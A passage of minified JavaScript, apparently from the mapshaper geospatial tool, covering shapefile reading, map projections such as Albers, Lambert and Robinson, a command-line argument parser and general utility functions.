e,t=this.readXY(),n=o?this.readZ():null,r=a&&this.hasM()?this.readM():null,i=[],s=0,u=t.length/2;u>s;s++)e=[t[2*s],t[2*s+1]],n&&e.push(n[s]),r&&e.push(r[s]),i.push(e);return i},readPartSizes:function(){var e,t,n,r=[];if(0===this.pointCount);else if(1==this.partCount)r.push(this.pointCount);else{t=0,n=this._data().skipBytes(56);for(var i=0,o=this.partCount;o>i;i++)e=(o-1>i?n.readUint32():this.pointCount)-t,e>0&&(r.push(e),t+=e)}return r}},c={read:function(){var e=2;return o&&e++,this.hasM()&&e++,this._data().skipBytes(12).readFloat64Array(e)},stream:function(e){var t=this._data().skipBytes(12);e.addPoint(t.readFloat64(),t.readFloat64()),e.endPath()}},f={readBounds:function(){return this._data().skipBytes(12).readFloat64Array(4)},stream:function(e){for(var t,n=this.readPartSizes(),r=this.readXY(),o=0,a=0;o<n.length;){for(t=n[o];t-->0;)e.addPoint(r[a++],r[a++]);e.endPath(),o++}r.length!=a&&i("Counting error")},read:function(){for(var e=[],t=this.readPartSizes(),n=this.readPoints(),r=0,i=t.length-1;i>r;r++)e.push(n.splice(0,t[r]));return e.push(n),e}},p={_mpos:function(){var e=this._xypos()+16*this.pointCount;return o&&(e+=8*this.pointCount+u),e},readMBounds:function(){return this.hasM()?this._data().skipBytes(this._mpos()).readFloat64Array(2):null},readM:function(){return this.hasM()?this._data().skipBytes(this._mpos()+u).readFloat64Array(this.pointCount):null},hasM:function(){var e=this._mpos(),t=e+8*this.pointCount+u;return this.byteLength==e?!1:this.byteLength==t?!0:void i("#hasM() Counting error")}},d={_zpos:function(){return this._xypos()+16*this.pointCount},readZBounds:function(){return this._data().skipBytes(this._zpos()).readFloat64Array(2)},readZ:function(){return this._data().skipBytes(this._zpos()+u).readFloat64Array(this.pointCount)}};return s?yt.extend(l,c):yt.extend(l,f),o&&yt.extend(l,d),a&&yt.extend(l,p),t.prototype=l,l.constructor=t,t}function Se(e){function t(){a=100,l=0,u=1}function n(e){var t={signature:e.bigEndian().readUint32(),byteLength:2*e.skipBytes(20).readUint32(),version:e.littleEndian().readUint32(),type:e.readUint32(),bounds:e.readFloat64Array(4),zbounds:e.readFloat64Array(2),mbounds:e.readFloat64Array(2)};return 9994!=t.signature&&i("Not a valid .shp file"),It.isSupportedShapefileType(t.type)||i("Unsupported .shp type:",t.type),t.byteLength!=c.size()&&i("File size of .shp doesn't match size in header"),t}function r(e,t){var n,r,i,o,a,s,u,l=null;return p>=e+12&&(u=c.readBytes(12,e),i=u.bigEndian().readUint32(),n=2*u.readUint32()+8,r=u.littleEndian().readUint32(),o=i==t,a=p>=e+n&&n>=12,s=0===r||r==f.type,a&&s&&(u=c.readBytes(n,e),l=new d(u,n))),l}function o(e,t){for(var n,i,o,a=e,s=null;p>=a+12;){if(n=c.readBytes(12,a),i=n.bigEndian().readUint32(),o=n.littleEndian().skipBytes(4).readUint32(),i==t&&(o==f.type||0===o)){s=r(a,t);break}a+=4}return l+=s?a-e:p-e,s}if(this instanceof Se==!1)return new Se(e);var a,u,l,c=yt.isString(e)?new we(e):new Pe(e),f=n(c.readBytes(100,0)),p=c.size(),d=new be(f.type);t(),this.header=function(){return f},this.forEachShape=function(e){for(var t=this.nextShape();t;)e(t),t=this.nextShape()},this.nextShape=function(){var e=r(a,u);if(!e&&p>=a+12&&(e=o(a+4,u)),e){if(a+=e.byteLength,e.id<u)return s("[shp] Record "+e.id+" appears more than once -- possible file corruption."),this.nextShape();u++}else l>0&&s("[shp] Skipped "+l+" bytes in .shp file -- possible data loss."),c.close(),t();return e}}function Pe(e){var t=new n(e),r=t.size();this.readBytes=function(e,n){return n+e>r&&i("Out-of-range error"),t.position(n),t},this.size=function(){return r},this.close=function(){}}function we(e){function t(t,c){var f,p=u-c,d=Math.min(p,Math.max(a,t)),h=new Buffer(d);o||(o=s.openSync(e,"r")),f=s.readSync(o,h,0,d,c),d>f&&i("Error reading file"),l=c,r=new n(h)}var r,o,a=16777215,s=require("fs"),u=Dt.fileSize(e),l=0;this.readBytes=function(e,n){return n+e>u&&i("Out-of-range error"),(!r||l>n||n+e>l+r.size())&&t(e,n),r.position(n-l),r},this.size=function(){return u},this.close=function(){o&&(s.closeSync(o),o=null,r=null,l=0)}}function Ie(e,t){function n(){return r||(r=new ne(i.readRows()),i=null,e=null),r}var r,i=new te(e,t),o=!1;this.exportAsDbf=function(e){return i&&!o?i.getBuffer():n().exportAsDbf(e)},this.getRecordAt=function(e){return i?i.readRow(e):r.getRecordAt(e)},this.deleteField=function(e){r?r.deleteField(e):(o=!0,i.deleteField(e))},this.getRecords=function(){return n().getRecords()},this.getFields=function(){return i?i.getFields():r.getFields()},this.size=function(){return i?i.size():r.size()}}function Ae(){function e(){var e={};return i&&(e.sum=r),a>0&&(e.average=o/a),l.length>0&&(e.median=yt.findMedian(l)),1/0>s&&(e.min=s),u>-(1/0)&&(e.max=u),n>0&&(e.count=n),e}var t={},n=0,r=0,i=!1,o=0,a=0,s=1/0,u=-(1/0),l=[];return t.sum=function(e){r+=e,i=!0},t.count=function(){n++},t.average=function(e){a++,o+=e},t.median=function(e){l.push(e)},t.max=function(e){e>u&&(u=e)},t.min=function(e){s>e&&(s=e)},{done:e,functions:t}}function Fe(e){for(var t=0,n="",r=e.concat();Ee(r);)t++,n="-ms",t>1&&(n+=String(t)),r=_e(e,n);return r}function _e(e,t){return e.map(function(e){return yt.getPathBase(e)+t+"."+yt.getFileExtension(e)})}function Ee(e){return yt.some(e,function(e){return Dt.isFile(e)||Dt.isDirectory(e)})}function Me(e,t,n,r){var i={spherical:!1,x0:0,y0:0,k0:1,to_meter:1,R:6378137,E:.0818191908426215,projectLatLng:function(e,t,n){return n=n||{},this.forward(t*Ot,e*Ot,n),n.x=(this.R*n.x+this.x0)/this.to_meter,n.y=(this.R*n.y+this.y0)/this.to_meter,n},unprojectXY:function(e,t,n){return e=(e*this.to_meter-this.x0)/this.R,t=(t*this.to_meter-this.y0)/this.R,n=n||{},this.inverse(e,t,n),n.lat/=Ot,n.lng/=Ot,n},inverseEllApprox:function(e,t,n){for(var r={},i=0,o=0,a=4;;){if(this.spherical=!0,this.inverse(e+i,t+o,n),this.spherical=!1,!--a)break;this.forward(n.lng,n.lat,r),i+=e-r.x,o+=t-r.y}}};n=yt.extend({},n),r&&r.forEach(function(e){if(e in n==!1)throw new Error("["+t+"] Missing required parameter:",e);n[e]=n[e]*Ot}),yt.extend(e,i,n),e.name=t,n.units&&(e.to_meter=Ce(n.units))}function Ce(e){e=e.toLowerCase().replace(/-_/g,"");var t={meters:1,feet:.3048,usfeet:.304800609601219}[e];if(!t)throw new Error("[proj] Unsupported units, use to_meter param:",e);return 1/t}function Ne(){return new Le({spherical:!0})}function Le(e){e=yt.extend({lng0:0},e),Me(this,"mercator",e,["lng0"]),this.forward=function(e,t,n){n.x=e-this.lng0,this.spherical?n.y=Math.log(Math.tan(.25*Math.PI+.5*t)):n.y=Math.log(Math.tan(.25*Math.PI+.5*t)*Math.pow((1-this.E*Math.sin(t))/(1+this.E*Math.sin(t)),.5*this.E))},this.inverse=function(e,t,n){this.spherical?(n.lng=e+this.lng0,n.lat=.5*Math.PI-2*Math.atan(Math.exp(-t))):this.inverseEllApprox(e,t,n)}}function Te(e){var t=/^([\d]+)([NS])$/.exec(e.zone||"");if(!t)throw new Error("[UTM] Expected a UTM zone parameter of the form: 17N");var n=parseFloat(t[1]),r=new Be({k0:.9996,lng0:6*n-183,lat0:0,x0:5e5,y0:"S"==t[2]?1e7:0});return r}function Be(e){Me(this,"transverse_mercator",e,["lat0","lng0"]);var t=Oe(this.lat0,this.E);this.forward=function(e,n,r){if(this.spherical){var i=Math.cos(n)*Math.sin(e-this.lng0);r.x=.5*this.k0*Math.log((1+i)/(1-i)),r.y=this.k0*(Math.atan(Math.tan(n)/Math.cos(e-this.lng0))-this.lat0)}else{var o=this.E*this.E,a=o/(1-o),s=Math.sin(n),u=Math.cos(n),l=Math.tan(n),c=1/Math.sqrt(1-o*s*s),f=l*l,p=a*u*u,d=u*(e-this.lng0),h=d*d,g=Oe(n,this.E);r.x=this.k0*c*(d+d*h/6*(1-f+p)+h*h*d/120*(5-18*f+f*f+72*p-58*a)),r.y=this.k0*(g-t+c*l*(h/2+h*h/24*(5-f+9*p+4*p*p)))}},this.inverse=function(e,t,n){if(this.spherical){var r=t/this.k0+this.lat0;n.lat=Math.asin(Math.sin(r)/Re(e/this.k0)),n.lng=this.lng0+Math.atan(De(e/this.k0)/Math.cos(r))}else this.inverseEllApprox(e,t,n)}}function De(e){return.5*(Math.exp(e)-Math.exp(-e))}function Re(e){return.5*(Math.exp(e)+Math.exp(-e))}function Oe(e,t){var n=t*t,r=n*n,i=r*n;return e*(1-n/4-3*r/64-5*i/256)-Math.sin(2*e)*(3*n/8+3*r/32+45*i/1024)+Math.sin(4*e)*(15*r/256+45*i/1024)-Math.sin(6*e)*(35*i/3072)}function je(e){var t=new Ge({lng0:-96,lat1:33,lat2:45,lat0:39,spherical:!0});return new $e(new ke(e)).addFrame(t,{lat:63,lng:-152},{lat:27,lng:-115},6e6,3e6,.31,29.2).addFrame(t,{lat:20.9,lng:-157},{lat:28.2,lng:-106.6},3e6,5e6,.9,40)}function ke(e){return new Ue(yt.extend({lng0:-96,lat1:29.5,lat2:45.5,lat0:37.5},e))}function Ue(e){Me(this,"albers",e,["lat0","lat1","lat2","lng0"]);var t=this.E,n=Math.cos(this.lat1),r=Math.sin(this.lat1),i=.5*(r+Math.sin(this.lat2)),o=n*n+2*i*r,a=Math.sqrt(o-2*i*Math.sin(this.lat0))/i,s=Ve(t,this.lat1),u=Ve(t,this.lat2),l=ze(t,this.lat0),c=ze(t,this.lat1),f=ze(t,this.lat2),p=(s*s-u*u)/(f-c),d=s*s+p*c,h=Math.sqrt(d-p*l)/p,g=1-(1-t*t)/(2*t)*Math.log((1-t)/(1+t));this.forward=function(e,n,r){var s,u,l;this.spherical?(s=Math.sqrt(o-2*i*Math.sin(n))/i,u=i*(e-this.lng0),r.x=s*Math.sin(u),r.y=a-s*Math.cos(u)):(l=ze(t,n),s=Math.sqrt(d-p*l)/p,u=p*(e-this.lng0),r.x=s*Math.sin(u),r.y=h-s*Math.cos(u))},this.inverse=function(e,n,r){var s,u,l,c,f,m;this.spherical?(s=Math.sqrt(e*e+(a-n)*(a-n)),u=Math.atan(e/(a-n)),r.lat=Math.asin(.5*(o-s*s*i*i)/i),r.lng=u/i+this.lng0):(u=Math.atan(e/(h-n)),r.lng=this.lng0+u/p,l=t*t,c=l*l,s=Math.sqrt(e*e+(h-n)*(h-n)),f=(d-s*s*p*p)/p,m=Math.asin(f/g),r.lat=m+Math.sin(2*m)*(l/3+31*c/180+517*c*l/5040)+Math.sin(4*m)*(23*c/360+251*c*l/3780)+761*Math.sin(6*m)*c*l/45360)}}function ze(e,t){var n=Math.sin(t);return(1-e*e)*(n/(1-e*e*n*n)-.5/e*Math.log((1-e*n)/(1+e*n)))}function Ve(e,t){var n=Math.sin(t);return Math.cos(t)/Math.sqrt(1-e*e*n*n)}function Ge(e){Me(this,"lambertcc",e,["lat0","lat1","lat2","lng0"]);var t=this.E,n=Math.log(Math.cos(this.lat1)/Math.cos(this.lat2))/Math.log(Math.tan(Math.PI/4+this.lat2/2)/Math.tan(Math.PI/4+this.lat1/2)),r=Math.cos(this.lat1)*Math.pow(Math.tan(Math.PI/4+this.lat1/2),n)/n,i=r/Math.pow(Math.tan(Math.PI/4+this.lat0/2),n),o=(Math.log(Je(this.lat1,t))-Math.log(Je(this.lat2,t)))/(Math.log(qe(this.lat1,t))-Math.log(qe(this.lat2,t))),a=Je(this.lat1,t)/(o*Math.pow(qe(this.lat1,t),o)),s=a*Math.pow(qe(this.lat0,t),o);this.forward=function(e,u,l){var c,f;if(this.spherical)c=r/Math.pow(Math.tan(Math.PI/4+u/2),n),f=n*(e-this.lng0),l.x=c*Math.sin(f),l.y=i-c*Math.cos(f);else{var p=qe(u,t);c=a*Math.pow(p,o),f=o*(e-this.lng0),l.x=c*Math.sin(f),l.y=s-c*Math.cos(f)}},this.inverse=function(e,t,o){if(this.spherical){var a=i,s=Math.sqrt(e*e+(a-t)*(a-t));0>n&&(s=-s);var u=Math.atan(e/(a-t));o.lat=2*Math.atan(Math.pow(r/s,1/n))-.5*Math.PI,o.lng=u/n+this.lng0}else this.inverseEllApprox(e,t,o)}}function qe(e,t){var n=Math.sin(e);return Math.tan(Math.PI/4-e/2)/Math.pow((1-t*n)/(1+t*n),t/2)}function Je(e,t){var n=Math.sin(e);return Math.cos(e)/Math.sqrt(1-t*t*n*n)}function He(){Me(this,"winkel_tripel"),this.forward=function(e,t,n){var r=50.467*Ot,i=Math.acos(Math.cos(t)*Math.cos(.5*e)),o=0===i?1:Math.sin(i)/i;n.x=.5*(e*Math.cos(r)+2*Math.cos(t)*Math.sin(.5*e)/o),n.y=.5*(t+Math.sin(t)/o)}}function Ye(){Me(this,"robinson");var e=.8487,t=1.3523,n=[1,-5.67239e-12,-715511e-10,311028e-11,.9986,-482241e-9,-24897e-9,-133094e-11,.9954,-831031e-9,-44861e-9,-9.86588e-7,.99,-.00135363,-596598e-10,367749e-11,.9822,-.00167442,-44975e-10,-572394e-11,.973,-.00214869,-903565e-10,1.88767e-8,.96,-.00305084,-900732e-10,164869e-11,.9427,-.00382792,-653428e-10,-261493e-11,.9216,-.00467747,-104566e-9,48122e-10,.8962,-.00536222,-323834e-10,-543445e-11,.8679,-.00609364,-1139e-7,332521e-11,.835,-.00698325,-640219e-10,9.34582e-7,.7986,-.00755337,-500038e-10,9.35532e-7,.7597,-.00798325,-359716e-10,-227604e-11,.7186,-.00851366,-70112e-9,-863072e-11,.6732,-.00986209,-199572e-9,191978e-10,.6213,-.010418,883948e-10,624031e-11,.5722,-.00906601,181999e-9,624033e-11,.5322,0,0,0],r=[0,.0124,3.72529e-10,1.15484e-9,.062,.0124001,1.76951e-8,-5.92321e-9,.124,.0123998,-7.09668e-8,2.25753e-8,.186,.0124008,2.66917e-7,-8.44523e-8,.248,.0123971,-9.99682e-7,3.15569e-7,.31,.0124108,373349e-11,-11779e-10,.372,.0123598,-13935e-9,439588e-11,.434,.0125501,520034e-10,-100051e-10,.4968,.0123198,-980735e-10,922397e-11,.5571,.0120308,402857e-10,-52901e-10,.6176,.0120369,-390662e-10,7.36117e-7,.6769,.0117015,-280246e-10,-8.54283e-7,.7346,.0113572,-408389e-10,-5.18524e-7,.7903,.0109099,-486169e-10,-10718e-10,.8435,.0103433,-646934e-10,5.36384e-9,.8936,.00969679,-646129e-10,-854894e-11,.9394,.00840949,-192847e-9,-421023e-11,.9761,.00616525,-256001e-9,-421021e-11,1,0,0,0];this.forward=function(i,o,a){var s=Math.abs(o),u=Math.min(Math.floor(11.459155902616464*s),17),l=(s-.08726646259971647*u)/Ot,c=0>o?-1:1,f=4*u;a.x=(((l*n[f+3]+n[f+2])*l+n[f+1])*l+n[f])*i*e,a.y=(((l*r[f+3]+r[f+2])*l+r[f+1])*l+r[f])*t*c}}function $e(e){var t=[];this.addFrame=function(n,r,i,o,a,s,u){var l=e.projectLatLng(r.lat,r.lng),c=e.projectLatLng(i.lat,i.lng),f=[l.x-.5*o,l.y-.5*a,l.x+.5*o,l.y+.5*a],p=new We;return p.rotate(u*Ot,l.x,l.y),p.scale(s,s),p.transformXY(l.x,l.y,l),p.translate(c.x-l.x,c.y-l.y),t.push({bbox:f,matrix:p,projection:n}),this},this.projectLatLng=function(n,r,i){var o,a;i=e.projectLatLng(n,r,i);for(var s=0,u=t.length;u>s;s++)if(o=t[s],a=o.bbox,i.x>=a[0]&&i.x<=a[2]&&i.y>=a[1]&&i.y<=a[3]){o.projection.projectLatLng(n,r,i),o.matrix.transformXY(i.x,i.y,i);break}return i},this.unprojectXY=function(t,n,r){return e.unprojectXY.call(e,t,n,r)}}function We(){this.a=1,this.c=0,this.tx=0,this.b=0,this.d=1,this.ty=0}function Xe(){function e(e){for(var t;e>0&&(t=e-1>>1,!o(e,t));)n(e,t),e=t;return e}function t(e){for(var t=a(e);t>e;)n(e,t),e=t,t=a(e)}function n(e,t){var n=u[e];r(e,u[t]),r(t,n)}function r(e,t){l[t]=e,u[e]=t}function o(e,t){var n=u[e],r=u[t],i=s[n],o=s[r];return i>o||i===o&&n>r}function a(e){var t=2*e+1,n=t+1,r=p;return r>t&&o(e,t)&&(e=t),r>n&&o(e,n)&&(e=n),e}var s,u,l,c=yt.expandoBuffer(Int32Array),f=yt.expandoBuffer(Int32Array),p=0;this.init=function(e){var n;for(s=e,p=e.length,u=c(p),l=f(p),n=0;p>n;n++)r(n,n);for(n=p-2>>1;n>=0;n--)t(n)},this.size=function(){return p},this.updateValue=function(n,r){var o=l[n];s[n]=r,o>=0&&p>o||i("Out-of-range heap index."),t(e(o))},this.popValue=function(){return s[this.pop()]},this.pop=function(){var e;return 0>=p&&i("Tried to pop from an empty heap."),e=u[0],r(0,u[--p]),t(0),e}}function Ze(){function e(){return u.map(function(e){return e.done()})}var t,n=/^--?([a-z][\w-]*)$/i,r=/^([a-z0-9_+-]+)=(?!\=)(.*)$/i,i="",a=[],u=[],l=null;return this instanceof Ze==!1?new Ze:(this.usage=function(e){return i=e,this},this.note=function(e){return t=e,this},this["default"]=function(e){l=e},this.example=function(e){a.push(e)},this.command=function(e){var t=new Ke(e);return u.push(t),t},this.parseArgv=function(t){function i(t){return!!yt.find(e(),function(e){return t===e.name||t===e.alias})}function a(e){return n.test(e)}function s(e,t,n){var i=r.exec(t),a=i[1],s=yt.trimQuotes(i[2]),l=d(a,n);l?"flag"==l.type||l.assign_to?o("-"+n.name+" "+a+" option doesn't take a value"):u(e,[a,s],n):e._.push(t)}function u(e,t,n){var i,o=t.shift(),a=d(o,n);return r.test(o)?void s(e,o,n):a?(i=a.alias_to||a.name,i=i.replace(/-/g,"_"),void(a.assign_to?e.options[a.assign_to]=a.name:"flag"==a.type?e.options[i]=!0:e.options[i]=c(t,a))):void e._.push(o)}function c(e,t){var n,r,i,s=t.type;return 0===e.length||a(e[0])?r="Missing value":(i=e.shift(),n="number"==s?Number(i):"integer"==s?Math.round(Number(i)):"comma-sep"==s?i.split(","):i,n!==n&&(r="Invalid numeric value")),r&&o(r+" for option "+t.name+"=<value>"),n}function f(e){var t=n.exec(e[0]);return t?(e.shift(),t[1]):null}function p(e,t){return yt.find(t,function(t){return t.name===e||t.alias===e})}function d(e,t){return yt.find(t.options,function(t){return t.name===e||t.alias===e})}var h,g,m,y=e(),v=[],x=t.map(yt.trimQuotes);for(1==x.length&&i(x[0])?x.unshift("-help"):x.length>0&&!a(x[0])&&l&&x.unshift("-"+l);x.length>0;){for(g=f(x),g||o("Invalid command:",x[0]),m=p(g,y),m||o("Unknown command:",g),h={name:m.name,options:{},_:[]};x.length>0&&!a(x[0]);)u(h,x,m);if(m.validate)try{m.validate(h)}catch(b){o("[ "+g+" ] "+b.message)}v.push(h)}return v},this.getHelpMessage=function(n){function r(e,t){return yt.rpad(e,h," ")+d+(t||"")+"\n"}function o(e){return e.help=f,e.label?e.help+=e.label:(e.help+=e.name,e.alias&&(e.help+=", "+e.alias),"flag"==e.type||e.assign_to||(e.help+="=")),e.help.length}var s,u,l="",c="  ",f="  ",p="  ",d="  ",h=0,g=!1;return u=e().filter(function(e){return!!e.describe}),n&&(g=!0,s=n.reduce(function(e,t){var n=yt.find(u,function(e){return e.name==t});return n&&e.push(n),e},[]),u.filter(function(e){return yt.contains(n,e.name)}),0===s.length&&(g=!1)),g||(i&&(l+="\n"+i+"\n\n"),s=u),h=s.reduce(function(e,t){var n=c+(t.name?"-"+t.name:"");return t.alias&&(n+=", -"+t.alias),t.help=n,g&&(e=t.options.reduce(function(e,t){return t.describe&&(e=Math.max(o(t),e)),e},e)),Math.max(e,n.length)},0),s.forEach(function(e){!g&&e.title&&(l+=e.title+"\n"),g&&(l+="\nCommand\n"),l+=r(e.help,e.describe),g&&e.options.length>0&&(l+="\nOptions\n",e.options.forEach(function(e){e.help&&e.describe&&(l+=r(e.help,e.describe))})),g&&e.examples&&(l+="\nExample"+(e.examples.length>1?"s":""),e.examples.forEach(function(e){e.split("\n").forEach(function(e){l+="\n"+p+e}),l+="\n"}))}),g||(a.length>0&&(l+="\nExamples\n",a.forEach(function(e){l+="\n"+e+"\n"})),t&&(l+="\n"+t)),l},void(this.printHelp=function(e){s(this.getHelpMessage(e))}))}function Ke(e){var t={name:e,options:[]};this.validate=function(e){return t.validate=e,this},this.describe=function(e){return t.describe=e,this},this.example=function(e){return t.examples||(t.examples=[]),t.examples.push(e),this},this.alias=function(e){return t.alias=e,this},this.title=function(e){return t.title=e,this},this.option=function(e,n){return n=n||{},yt.isString(e)&&e||i("Missing option name"),yt.isObject(n)||i("Invalid option definition:",n),n.name=e,t.options.push(n),this},this.done=function(){return t}}function Qe(e){var t=gt(e._[0]);t&&(e.options.commands=t)}function et(e){var t=e.options,n=e._;"-"==n[0]||"/dev/stdin"==n[0]?t.stdin=!0:n.length>0&&(t.files=n),"precision"in t&&t.precision>0==!1&&i("precision= option should be a positive number"),t.encoding&&(t.encoding=It.validateEncoding(t.encoding))}function tt(e){var t=e.options,n=e._,r=t.pct||"";if(n.length>0&&(/^[0-9.]+%?$/.test(n[0])&&(r=n.shift()),n.length>0&&i("Unparsable option:",n.join(" "))),r){var o=r.indexOf("%")>0;o?t.pct=Number(r.replace("%",""))/100:t.pct=Number(r),t.pct>=0&&t.pct<=1||i(yt.format("Out-of-range pct value: %s",r))}var a=t.interval;a&&(t.interval=Number(a),t.interval>=0==!1&&i(yt.format("Out-of-range interval value: %s",a))),isNaN(t.interval)&&isNaN(t.pct)&&!t.resolution&&i("Command requires an interval, pct or resolution parameter")}function nt(e){var t=e.options;t.source=t.source||e._[0],t.source||i("Command requires the name of a layer or file to join")}function rt(e){1==e._.length?e.options.field=e._[0]:e._.length>1&&i("Command takes a single field name")}function it(e){var t=e.options;e._[0]&&(t.source=e._[0]),t.cleanup&&(delete t.cleanup,t.remove_slivers=!0),t.bbox&&(t.bbox=t.bbox.map(parseFloat)),t.source||t.bbox||i("Command requires a source file, layer id or bbox")}function ot(e){var t=e._,n=e.options;1==t.length?n.field=t[0]:t.length>1&&i("Command takes a single field name")}function at(e){e._.length>0&&i("Unexpected option:",e._)}function st(e){e.options.names=gt(e._[0])||null}function ut(e){var t=e.options;if(1==e._.length){var n=e._[0].split(",");t.cols=parseInt(n[0],10),t.rows=parseInt(n[1],10)||t.cols}(t.rows>0==!1||t.cols>0==!1)&&i("Command expects cols,rows")}function lt(e){try{var t=gt(e.options.fields||e._[0]);t&&(e.options.fields=t)}catch(n){i("Command takes a comma-separated list of fields")}}function ct(e){e._.length>0&&i("Command takes no arguments")}function ft(e){1!==e._.length&&i("Command requires a JavaScript expression"),e.options.expression=e._[0]}function pt(e){try{var t=gt(e._[0]);e.options.fields=t||[]}catch(n){i("Command requires a comma-sep. list of fields")}}function dt(e){1==e._.length?e.options.expression=e._[0]:e._.length>1&&i("Unparsable arguments:",e._)}function ht(e){var t=e._,n=e.options,r=t[0]||"",o=yt.parseLocalPath(r);t.length>1&&i("Command takes one file or directory argument"),"-"==r||"/dev/stdout"==r?n.stdout=!0:r&&!o.extension?(Dt.isDirectory(r)||i("Unknown output option:",r),n.output_dir=r):r&&(o.directory&&(n.output_dir=o.directory,Dt.validateOutputDir(n.output_dir)),n.output_file=o.filename,It.filenameIsUnsupportedOutputType(n.output_file)&&i("Output file looks like an unsupported file type:",n.output_file)),n.format&&(n.format=n.format.toLowerCase(),"csv"==n.format?(n.format="dsv",n.delimiter=n.delimiter||","):"tsv"==n.format&&(n.format="dsv",n.delimiter=n.delimiter||"	"),It.isSupportedOutputFormat(n.format)||i("Unsupported output format:",n.format)),n.delimiter&&(n.delimiter=n.delimiter.replace(/^["']?\\t["']?$/,"	"),It.isSupportedDelimiter(n.delimiter)||i("Unsupported delimiter:",n.delimiter)),n.encoding&&(n.encoding=It.validateEncoding(n.encoding)),"quantization"in n&&n.quantization>0==!1&&i("quantization= option should be a nonnegative integer"),"topojson_precision"in n&&n.topojson_precision>0==!1&&i("topojson-precision= option should be a positive number")}function gt(e,t){if(!t&&!e)return null;yt.isString(e)||i("Expected a comma-separated list; found:",e);var n=e.split(",").map(yt.trim).filter(function(e){return!!e});return t&&t>n.length<t&&i(yt.format("Expected a list of at least %d member%s; found: %s",t,yt.pluralSuffix(t),e)),n.length>0?n:null}var mt="0.3.26",i=function(){var e=vt.toArray(arguments).join(" ");throw new Error(e)},yt={getUniqueName:function(e){var t=vt.__uniqcount||0;return vt.__uniqcount=t+1,(e||"__id_")+t},isFunction:function(e){return"function"==typeof e},isObject:function(e){return e===Object(e)},clamp:function(e,t,n){return t>e?t:e>n?n:e},interpolate:function(e,t,n){return e*(1-n)+t*n},isArray:function(e){return Array.isArray(e)},isNumber:function(e){return null!=e&&e.constructor==Number},isInteger:function(e){return vt.isNumber(e)&&(0|e)===e},isString:function(e){return null!=e&&e.toString===String.prototype.toString},isBoolean:function(e){return e===!0||e===!1},toArray:function(e){var t;vt.isArrayLike(e)||i("Utils.toArray() requires an array-like object");try{t=Array.prototype.slice.call(e,0)}catch(n){t=[];for(var r=0,o=e.length;o>r;r++)t[r]=e[r]}return t},isArrayLike:function(e){return e?vt.isArray(e)?!0:vt.isString(e)?!1:0===e.length?!0:e.length>0?!0:!1:!1},addslashes:function(e){return(e+"").replace(/[\\"']/g,"\\$&").replace(/\u0000/g,"\\0")},regexEscape:function(e){return e.replace(/[-[\]{}()*+?.,\\^$|#\s]/g,"\\$&")},defaults:function(e){for(var t=1,n=arguments.length;n>t;t++){var r=arguments[t]||{};for(var i in r)i in e==!1&&r.hasOwnProperty(i)&&(e[i]=r[i])}return e},extend:function(e){var t,n,r,i=e||{},o=arguments.length;for(n=1;o>n;n++){r=arguments[n]||{};for(t in r)r.hasOwnProperty(t)&&(i[t]=r[t])}return i},inherit:function(e,t){var n=function(){this.__super__==n&&(this.__super__=t.prototype.__super__,t.apply(this,arguments),delete this.__super__)};n.prototype=t.prototype||t,e.prototype=vt.extend(new n,e.prototype),e.prototype.constructor=e,e.prototype.__super__=n},subclass:function(e){var t=function(){this.__super__.apply(this,vt.toArray(arguments))};vt.inherit(t,e);for(var n=1;n<arguments.length;n++)vt.extend(t.prototype,arguments[n]);return t}},vt=yt,xt=function(){var e="undefined"!=typeof module&&!!module.exports,t="undefined"!=typeof window&&!e,n=t&&!(!window.phantom||!window.phantom.exit),r=t&&/MSIE ([0-9]+)/.exec(navigator.appVersion)&&parseInt(RegExp.$1)||NaN;return{iPhone:t&&!!navigator.userAgent.match(/iPhone/i),iPad:t&&!!navigator.userAgent.match(/iPad/i),canvas:t&&!!document.createElement("canvas").getContext,inNode:e,inPhantom:n,inBrowser:t,ieVersion:r,ie:!isNaN(r)}}(),bt={stack:[],verbose:!0,start:function(e){bt.verbose&&e&&u(bt.prefix()+e),bt.stack.push(+new Date)},stop:function(e){var t=bt.stack.pop(),n=+new Date-t;if(bt.verbose){var r=bt.prefix()+n+"ms";e&&(r+=" "+e),u(r)}return n},prefix:function(){for(var e="- ",t=this.stack.length;t--;)e="-"+e;return e}};yt.merge=function(e,t){return yt.isArray(e)&&yt.isArray(t)||i("Usage: utils.merge(destArray, srcArray);"),t.length>0&&e.push.apply(e,t),e},yt.difference=function(e,t){var n=yt.arrayToIndex(t);return e.filter(function(e){return!Object.prototype.hasOwnProperty.call(n,e)})},yt.contains=function(e,t){return yt.isString(e)?-1!=e.indexOf(t):yt.isArrayLike(e)?-1!=yt.indexOf(e,t):void i("Expected Array or String argument")},yt.some=function(e,t){return e.reduce(function(e,n){return e||t(n)},!1)},yt.every=function(e,t){return e.reduce(function(e,n){return e&&t(n)},!0)},yt.find=function(e,t,n){var r=e.filter(t,n);return 0===r.length?null:r[0]},yt.indexOf=function(e,t,n){n&&i("utils.indexOf() No longer supports property argument");for(var r=!(t===t),o=0,a=e.length||0;a>o;o++){if(e[o]===t)return o;if(r&&e[o]!==e[o])return o}return-1},yt.range=function(e,t,n){for(var r=[],i=void 0===t?0:t,o=void 0===n?1:n;e--;)r.push(i),i+=o;return r},yt.repeat=function(e,t){for(var n,r=[],i=0;e>i;i++)n=t(i),void 0!==n&&(r[i]=n);return r.length>0?r:void 0},yt.sum=function(e,t){yt.isArrayLike(e)||i("utils.sum() expects an array, received:",e);for(var n,r=0,o=0,a=0,s=e.length;s>a;a++)n=e[a],n?r+=n:isNaN(n)&&o++;return t&&(t.nan=o),r},yt.getArrayBounds=function(e){for(var t,n=1/0,r=-(1/0),i=0,o=0,a=e.length;a>o;o++)t=e[o],t!==t&&i++,n>t&&(n=t),t>r&&(r=t);return{min:n,max:r,nan:i}},yt.uniq=function(e){var t={};return e.reduce(function(e,n){return n in t==!1&&(t[n]=!0,e.push(n)),e},[])},yt.pluck=function(e,t){return e.map(function(e){return e[t]})},yt.countValues=function(e){return e.reduce(function(e,t){return e[t]=t in e?e[t]+1:1,e},{})},yt.indexOn=function(e,t){return e.reduce(function(e,n){return e[n[t]]=n,e},{})},yt.groupBy=function(e,t){return e.reduce(function(e,n){var r=n[t];return r in e?e[r].push(n):e[r]=[n],e},{})},yt.arrayToIndex=function(e,t){var n=arguments.length>1;return e.reduce(function(e,r){return e[r]=n?t:!0,e},{})},yt.forEach=function(e,t,n){if(!yt.isArrayLike(e))throw new Error("#forEach() takes an array-like argument. "+e);for(var r=0,i=e.length;i>r;r++)t.call(n,e[r],r)},yt.forEachProperty=function(e,t,n){Object.keys(e).forEach(function(r){t.call(n,e[r],r)})},yt.initializeArray=function(e,t){for(var n=0,r=e.length;r>n;n++)e[n]=t;return 